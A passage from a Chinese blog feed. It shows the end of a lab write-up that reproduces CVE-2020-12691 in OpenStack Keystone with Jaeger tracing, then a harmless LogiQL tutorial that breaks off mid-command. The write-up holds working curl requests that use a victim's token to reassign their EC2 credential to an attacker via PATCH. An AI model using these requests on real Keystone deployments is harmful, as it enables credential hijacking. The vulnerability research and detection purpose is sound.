class="line">docker run -itd -p 6831:6831/udp -p 6832:6832/udp -p 16686:16686 jaegertracing/all-in-one</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>使用 admin 用户执行以下指令，创建受害者（user1）和攻击者（user2）用户，并绑定角色和项目，最后各自生成一个 EC2 credential 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出角色</span></span><br><span class="line">openstack role list</span><br><span class="line"><span class="comment"># 创建角色</span></span><br><span class="line">openstack role create myrole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建项目及用户</span></span><br><span class="line">openstack project create --description <span class="string">&#x27;cve-2020-12691&#x27;</span> project1 --domain default</span><br><span class="line">openstack user create --project project1 --password password user1</span><br><span class="line">openstack project create --description <span class="string">&#x27;cve-2020-12691&#x27;</span> project2 --domain default</span><br><span class="line">openstack user create --project project2 --password password user2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置用户角色</span></span><br><span class="line">openstack role add --user user1 --project project1 admin</span><br><span class="line">openstack role add --user user2 --project project2 myrole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看角色分配</span></span><br><span class="line">openstack role assignment list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 credential</span></span><br><span class="line">openstack ec2 credentials create --project project1 --user user1 --user-domain default --project-domain default</span><br><span class="line">openstack ec2 credentials create --project project2 --user user2 --user-domain default --project-domain default</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 credential</span></span><br><span class="line">openstack credential list</span><br></pre></td></tr></table></figure><p>对 Keystone 进行<strong>插桩</strong>，追踪 <code>openstack credential list</code> 的执行链路。发现包含漏洞利用所需的所有信息，但对应的 X-Subject-Token 是 admin 用户的。</p><p>改用属于 admin 角色的 user1 用户执行该指令，admin 角色的用户可以查看所有 credential：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> OS_USERNAME=user1</span><br><span class="line"><span class="built_in">export</span> OS_PASSWORD=password</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_NAME=project1</span><br><span class="line"><span class="built_in">export</span> OS_USER_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_AUTH_URL=http://127.0.0.1:5000/v3</span><br><span class="line"><span class="built_in">export</span> OS_IDENTITY_API_VERSION=3</span><br><span class="line"></span><br><span class="line">openstack credential list</span><br></pre></td></tr></table></figure><p>（user1）除了 X-Subject-Token ，还包含 user_id、project_id</p><img src="https://i.loli.net/2021/11/05/e5yNWCf3OkQvLBJ.png" width="95%"><p>（user1）另一条 trace 中包含 credential ，根据 user_id 和 project_id ，可以辨认出 user1 用户的 credential</p><img src="https://i.loli.net/2021/11/05/aypQeJtBGnWDIhd.png" width="95%"><p>（user2）赋予 myrole 角色的 user2 只能看到自己的 credential 信息</p><img src="https://i.loli.net/2021/11/05/Uogye3GNDs9YkZb.jpg" width="95%"><p>（user2）追踪信息和 user1 用户的相同，包括自己的 X-Subject-Token、user_id、project_id</p><img src="https://i.loli.net/2021/11/05/o6hbXtQHZegaN83.png"><p>以下是漏洞利用的过程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取 User1 的 X-Subject-Token</span></span><br><span class="line">curl -i -s\</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123; &quot;auth&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;identity&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;methods&quot;: [&quot;password&quot;],</span></span><br><span class="line"><span class="string">      &quot;password&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;user&quot;: &#123;</span></span><br><span class="line"><span class="string">          &quot;name&quot;: &quot;user1&quot;,</span></span><br><span class="line"><span class="string">          &quot;domain&quot;: &#123; &quot;name&quot;: &quot;default&quot; &#125;,</span></span><br><span class="line"><span class="string">          &quot;password&quot;: &quot;password&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;scope&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;project&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;name&quot;: &quot;project1&quot;,</span></span><br><span class="line"><span class="string">        &quot;domain&quot;: &#123; &quot;name&quot;: &quot;default&quot; &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/auth/tokens?nocatalog&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 User1 的 credential（根据 user_id 和 peoject_id 查找）</span></span><br><span class="line">curl \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: gAAAAABgdRYFHdUj407-Ysq_SSPjsB5NXYDmjtFx6WCKcbgh7QBSIJSxa0s4b7RDs0fxO3eB5GW6X1vD9o1PSUQn-nKX2KzJRQHKhWHlDBWM8xjCWsZmfEMd7dOM0VyUXb5P8H4H4CKCqoCZcwQw-eibA_u6NWuNHG8kAR-AQR2OyDSKMF9X9Yg&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/credentials&quot;</span> | python -m json.tool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为 User2 的 user_id、project_id</span></span><br><span class="line">curl -X PATCH \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: gAAAAABgdRYFHdUj407-Ysq_SSPjsB5NXYDmjtFx6WCKcbgh7QBSIJSxa0s4b7RDs0fxO3eB5GW6X1vD9o1PSUQn-nKX2KzJRQHKhWHlDBWM8xjCWsZmfEMd7dOM0VyUXb5P8H4H4CKCqoCZcwQw-eibA_u6NWuNHG8kAR-AQR2OyDSKMF9X9Yg&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123; &quot;credential&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;project_id&quot;: &quot;b0419aebd03c40f3b8b0c413d19056ce&quot;,</span></span><br><span class="line"><span class="string">    &quot;user_id&quot;: &quot;6d173c8b8d354c0b8f890a0666821a64&quot;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/credentials/416f331f7a26867c8be1fe3c574b4878b09b58fd272b7ab60bb568b52deabdb9&quot;</span></span><br></pre></td></tr></table></figure><p>也就是说，只要获得了受害者的 X-Subject-Token、credential ，就可以通过 PATCH 请求将 credential 对应的所有者替换为攻击者的。</p><h1 id="Jaeger-API"><a href="#Jaeger-API" class="headerlink" title="Jaeger API"></a>Jaeger API</h1><p>返回追踪信息，保存为 json 格式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://jaeger-query:16686/api/traces/&#123;trace-id-hex-string&#125;</span></span><br><span class="line">curl <span class="string">&quot;http://localhost:16686/api/traces/a6192f3a980c57b5&quot;</span> -o 3.json</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> 3.json | python -mjson.tool</span><br></pre></td></tr></table></figure><p>这里的 <code>trace-id-hex-string</code> 是路径中完整的字符串，不是 Jaeger UI 中的缩略显示。</p><img src="https://i.loli.net/2021/11/05/FpVlJZf72TtvEXi.png" width="80%"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li><p>从复现漏洞利用的角度来说，链路追踪可以获取到大量的可用信息，帮助构建漏洞利用脚本；</p></li><li><p>从发现漏洞的角度来说，通过链路追踪的到的数据进行分析，可能发现异常。</p><ul><li>上述漏洞可以通过使用同一个用户执行相同指令，对比发现返回的结果不同。具体来说就是漏洞利用之前和之后 <code>openstack credential list</code> 返回的数据不一致，因此可以推断这里可能产生了异常。</li></ul></li></ol><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12691">CVE - CVE-2020-12691</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-12691">NVD - CVE-2020-12691</a></li><li><a href="https://docs.docker.com/engine/install/ubuntu/">Install Docker Engine on Ubuntu</a></li><li><a href="https://docs.docker.com/engine/install/linux-postinstall/">Post-installation steps for Linux</a></li><li><a href="https://docs.docker.com/compose/install/">Install Docker Compose</a></li><li><a href="https://www.jaegertracing.io/docs/1.22/getting-started/">Getting Started – Jaeger documentation</a></li></ul>]]></content>
    
    
    <summary type="html">使用 Jaeger 对 Keystone 进行追踪</summary>
    
    
    
    <category term="Jaeger" scheme="https://jckling.github.io/categories/Jaeger/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>LogiQL 入门</title>
    <link href="https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/"/>
    <id>https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/</id>
    <published>2021-10-26T08:15:05.000Z</published>
    <updated>2022-03-10T06:28:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近看的工具中用到了 <a href="https://bitbucket.org/yanniss/doop/src/master/">Doop</a>，这是一个以 <strong>指针分析</strong> 算法为中心的 Java 静态分析框架，使用 <a href="https://en.wikipedia.org/wiki/Datalog">Datalog</a> 规则形式表达的各种分析的集合。维护两套规则：</p><ul><li><a href="http://www.logicblox.com/">LogicBlox</a>：使用 LogiQL，Datalog 程序的构建块以 <strong>谓词</strong> 的形式出现，例如 <code>Person(&quot;John&quot;)</code>、<code>Parent(&quot;John&quot;, &quot;Johnny jr&quot;)</code>，利用 <strong>规则</strong>（IDB 逻辑）从已知的事实中推断出新的信息，例如 <code>Ancestor(x, y) &lt;- Parent(x, y)</code></li><li><a href="https://github.com/souffle-lang/souffle">souffle-lang&#x2F;souffle</a> (Systematic, Ontological, Undiscovered Fact Finding Logic Engine)：由 Datalog 启发的一种编程语言，可用于静态分析、网络分析和数据分析。默认使用该引擎。</li></ul><p>没看到默认用的是开源的 souffle，结果花了一下午入门 LogiQL 还有找 3.10.x 版本的 LogicBlox …</p><p>LogicBlox 一直是闭源软件，目前最新版本 4.x.x 都可以下载，<a href="https://developer.logicblox.com/release-archive-310/">Release Archive (LB 3.10.x)</a> 不再提供下载，可以通过 <a href="https://developer.logicblox.com/logicblox-academic-license-request/">LogicBlox Academic License Request</a> 申请。找了好久没地方下载还要申请，回头仔细看了看 Doop 的说明文档才发现应该去看 souffle 😅😅😅</p><p>LogiQL 入门跟着教程 <a href="https://developer.logicblox.com/content/docs4/tutorial/repl/section/split.html">LogiQL in 30 minutes</a> 走就好了，介绍的特别简单，能够让人刚踩到门槛上吧（大概）。</p><h1 id="0x01-LogiQL-入门"><a href="#0x01-LogiQL-入门" class="headerlink" title="0x01 LogiQL 入门"></a>0x01 LogiQL 入门</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>用在线的 <a href="https://repl.logicblox.com/">LogicBlox REPL (Read-Eval-Print Loop)</a> 进行实验，REPL 是一个基于命令的交互式环境，可以在其中执行 LogiQL 命令并立即检查结果。</p><h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>工作区（workspace）指代数据库（database），结合了模式（schema）、逻辑（logic）和数据（data）</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>定义一个冰淇淋商店会计系统，记录以下信息：</p><ul><li>成本（人工，原料）：cost(labor, ingredients)</li><li>价格：price</li><li>销量&#x2F;周：sales</li><li>每个冰淇淋的收入&#x2F;周：revenue</li><li>所有冰淇淋的收入&#x2F;周：week revenue</li><li>每个冰淇淋的收益&#x2F;周：profit</li><li>所有冰淇淋的收益&#x2F;周：week profit</li></ul><p>定义功能谓词（functional predicates）</p><ul><li>谓词类似 SQL 数据库中的表</li><li>除了最后一列之外的所有列都形成一个主键，最后一列表示值，因此一个主键最多可以关联一个值。</li></ul><h3 id="1-cost-谓词"><a href="#1-cost-谓词" class="headerlink" title="1. cost 谓词"></a>1. <code>cost</code> 谓词</h3><p>定义名为 cost 的谓词，键为 icecream，值为 c；指向右侧的箭头表示约束（constraint），icecream 的值必须是字符串、c 的值必须是整数</p><ul><li>约束表明如果箭头左侧为真，则右侧必须成立</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cost[icecream] = c -&gt;</span><br><span class="line">   string(icecream), int(c).</span><br></pre></td></tr></table></figure><p>在 REPL 中执行需要使用相应的命令，<code>addblock</code> 接受一个参数，在引号之间添加的定义的 LogiQL 代码。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;cost[icecream] = c -&gt;</span></span><br><span class="line"><span class="string">   string(icecream), int(c).&#x27;</span></span><br></pre></td></tr></table></figure><p>添加之后使用 <code>list</code> 命令列出谓词</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/oAX6JHgMvx5BeTu.png" width="80%"><h3 id="2-事实（facts）"><a href="#2-事实（facts）" class="headerlink" title="2. 事实（facts）"></a>2. 事实（facts）</h3><p>谓词中的数据条目在 LogiQL 中称为事实（facts）。</p><p>LogiQL 支持 3 种增量更新操作</p><ul><li>插入（insert）：插入新事实，使用 <code>+</code> 前缀</li><li>删除（remove）：删除事实，使用 <code>-</code> 前缀 </li><li>更新（upsert）：添加或更新，使用 <code>^</code> 前缀，只能应用在功能谓词上</li></ul><p>使用 <code>exec</code> 执行一次性的命令，而 <code>addblock</code> 可以理解为“永久”地将谓词添加到工作区。</p><p>添加一个成本为 23 的冰淇淋：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;+cost[&quot;Popsicle Lemon&quot;] = 23.&#x27;</span></span><br></pre></td></tr></table></figure><p><code>print</code> 命令用于打印谓词。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print cost</span><br></pre></td></tr></table></figure><p>添加冰淇淋（成本）：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;+cost[&quot;Fruit Sundae&quot;] = 120.</span></span><br><span class="line"><span class="string">+cost[&quot;Mango Sorbet&quot;] = 40.</span></span><br><span class="line"><span class="string">+cost[&quot;Cone Chocolate&quot;] = 50.</span></span><br><span class="line"><span class="string">+cost[&quot;Cone Vanilla&quot;] = 44.</span></span><br><span class="line"><span class="string">+cost[&quot;Cone Chili Fries&quot;] = 200.&#x27;</span></span><br></pre></td></tr></table></figure><p>更新冰淇淋的售价：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &#x27;^cost[&quot;Popsicle Lemon&quot;] = 25.&#x27;</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/3XDQBGNLoMxwfv4.png"><h3 id="3-price-谓词、week-sales-谓词"><a href="#3-price-谓词、week-sales-谓词" class="headerlink" title="3. price 谓词、week_sales 谓词"></a>3. <code>price</code> 谓词、<code>week_sales</code> 谓词</h3><p>定义谓词 price 表示冰淇淋的售价，定义谓词 week_sales 表示每周的销售数量（可以把 week_sales 看作二维映射）。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;price[icecream] = p -&gt;</span></span><br><span class="line"><span class="string">   string(icecream), int(p).</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">week_sales[icecream, week] = value -&gt;</span></span><br><span class="line"><span class="string">  string(icecream),</span></span><br><span class="line"><span class="string">  int(week),</span></span><br><span class="line"><span class="string">  int(value).&#x27;</span></span><br></pre></td></tr></table></figure><p>添加冰淇淋售价及其第 1、2 周的销量（往谓词中添加事实）：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;+price[&quot;Popsicle Lemon&quot;] = 50.</span></span><br><span class="line"><span class="string">+price[&quot;Fruit Sundae&quot;] = 200.</span></span><br><span class="line"><span class="string">+price[&quot;Mango Sorbet&quot;] = 70.</span></span><br><span class="line"><span class="string">+price[&quot;Cone Chocolate&quot;] = 80.</span></span><br><span class="line"><span class="string">+price[&quot;Cone Vanilla&quot;] = 70.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+week_sales[&quot;Popsicle Lemon&quot;, 1] = 122.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Fruit Sundae&quot;, 1] = 88.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Mango Sorbet&quot;, 1] = 72.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Chocolate&quot;, 1] = 4.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Vanilla&quot;, 1] = 257.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+week_sales[&quot;Popsicle Lemon&quot;, 2] = 112.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Fruit Sundae&quot;, 2] = 60.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Mango Sorbet&quot;, 2] = 44.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Chocolate&quot;, 2] = 9.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Vanilla&quot;, 2] = 200.&#x27;</span></span><br></pre></td></tr></table></figure><p>打印谓词：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print price</span><br><span class="line">print week_sales</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/vmKatAVFYOID2XH.png" width="90%"><h3 id="4-规则（rules）"><a href="#4-规则（rules）" class="headerlink" title="4. 规则（rules）"></a>4. 规则（rules）</h3><p>规则可用于推导新的事实，添加计算收入 <code>revenue</code> 的规则：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;week_revenue[icecream, week] =</span></span><br><span class="line"><span class="string">  price[icecream] * week_sales[icecream, week].&#x27;</span></span><br></pre></td></tr></table></figure><p>打印规则，该规则会自动进行计算：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print week_revenue</span><br></pre></td></tr></table></figure><p>修改一个价格，会自动进行重新计算：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 70.&#x27;</span></span><br><span class="line"></span><br><span class="line">print week_revenue</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/goQXUZ2zTp9JxYV.png" width="80%"><p>添加计算冰淇淋收益 <code>profit</code> 的规则、计算每周收益的规则 <code>week_profit</code>：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;profit[icecream] =</span></span><br><span class="line"><span class="string">  price[icecream] - cost[icecream].</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">week_profit[icecream, week] =</span></span><br><span class="line"><span class="string">  profit[icecream] * week_sales[icecream, week].&#x27;</span></span><br></pre></td></tr></table></figure><p>然后打印规则，会自动进行计算：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print profit</span><br><span class="line">print week_profit</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/VB3QW2kjvSnFNMG.png" width="80%"><h3 id="5-聚合函数（Aggregate）"><a href="#5-聚合函数（Aggregate）" class="headerlink" title="5. 聚合函数（Aggregate）"></a>5. 聚合函数（Aggregate）</h3><p>和 SQL 类似，LogiQL 中也有聚合函数。</p><p>定义 agg_profit 规则，使用 <code>total()</code> 聚合函数求和，将 profit 中所有事实的值 p 求和绑定到 value，其中 week 是聚合的周，使用通配符 <code>_</code> 忽略冰淇淋类型。表示总收益（收入-成本）。</p><p>agg_revenue 规则也是类似的定义，只不过把 p 换成了 r，表示总收入。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">agg_profit[week] = value &lt;-</span><br><span class="line">   agg&lt;&lt;value=total(p)&gt;&gt; week_profit[<span class="symbol">_</span>, week] = p.</span><br><span class="line"> </span><br><span class="line">agg_revenue[week] = value &lt;-</span><br><span class="line">   agg&lt;&lt;value=total(r)&gt;&gt; week_revenue[<span class="symbol">_</span>, week] = r.</span><br></pre></td></tr></table></figure><p>使用 <code>addblock</code> 添加规则：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;agg_profit[week] = value &lt;-</span></span><br><span class="line"><span class="string">    agg&lt;&lt;value=total(p)&gt;&gt; week_profit[_, week] = p.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">agg_revenue[week] = value &lt;-</span></span><br><span class="line"><span class="string">   agg&lt;&lt;value=total(r)&gt;&gt; week_revenue[_, week] = r.&#x27;</span></span><br></pre></td></tr></table></figure><p>打印规则，得到聚合的结果：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print agg_profit</span><br><span class="line">print agg_revenue</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/itCR34j9Fl5PGkI.png" width="85%"><p>定义一个没有键的规则计算 price 谓词中的事实（条目）数量，即冰淇淋类型的数量：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;icecream_count[] = value &lt;-</span></span><br><span class="line"><span class="string">    agg&lt;&lt;value=count()&gt;&gt; price[_] = _.&#x27;</span></span><br></pre></td></tr></table></figure><p>打印规则，得到冰淇淋类型的数量：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print icecream_count</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/zhCBUYFmRMZawT1.png" width="80%"><h3 id="6-查询（query）"><a href="#6-查询（query）" class="headerlink" title="6. 查询（query）"></a>6. 查询（query）</h3><p>之前使用 print 查看谓词和规则的值，现在可以用 query 执行更高级的查询。</p><p>定义一个谓词 <code>_</code> 用事实填充，通常使用规则实现。</p><p>下面的查询与 <code>print week_sales</code> 拥有等价的结果。这里不使用功能谓词语法 <code>predicate[k1, k2] = v</code>，而是使用 <code>predicate(k1, k2, k3)</code>，因为这里对键值不感兴趣，只对事实感兴趣。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query <span class="string">&#x27;_(icecream, week, value) &lt;-</span></span><br><span class="line"><span class="string">  week_sales[icecream, week] = value.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/iXhUMutwd63Sxfz.png" width="95%"><p>检索 week_sales 谓词中使用的所有冰淇淋，尽管 week_sales 谓词多次包含这些值中的每一个，但每个不同值只返回一次（有 1、2 两周的数据，所以冰淇淋重复出现）</p><ul><li>在 LogiQL 中所有谓词都是集合：每一行只能出现一次</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query <span class="string">&#x27;_(icecream) &lt;- week_sales[icecream, _] = _.&#x27;</span></span><br></pre></td></tr></table></figure><p>将冰淇淋和每周的销售额、收入、收益整合在一起，就像 SQL 中的 JOIN 操作：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">query <span class="string">&#x27;_(icecream, week, sales, revenue, profit) &lt;-</span></span><br><span class="line"><span class="string">  week_sales[icecream, week] = sales,</span></span><br><span class="line"><span class="string">  week_revenue[icecream, week] = revenue,</span></span><br><span class="line"><span class="string">  week_profit[icecream, week] = profit.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/6QKeRXIA9wf3c4j.png" width="80%"><h3 id="7-约束（constraint）"><a href="#7-约束（constraint）" class="headerlink" title="7. 约束（constraint）"></a>7. 约束（constraint）</h3><p>降低冰淇淋的售价，再次查询发现冰淇淋的收益变成了负数：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 20.&#x27;</span></span><br><span class="line">query <span class="string">&#x27;_(profit) &lt;- profit[&quot;Popsicle Lemon&quot;] = profit.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/UwXr3PaOCH7bV4G.png" width="80%"><p>定义一个约束：对于 profit 谓词中的每个事实，value 应该大于等于 0。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profit[<span class="symbol">_</span>] = value -&gt; value &gt;= <span class="number">0.</span></span><br></pre></td></tr></table></figure><p>使用 <code>addblock</code> 添加约束，因为 profit 谓词中有事实的 value 值小于 0，所以添加约束失败。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;profit[_] = value -&gt; value &gt;= 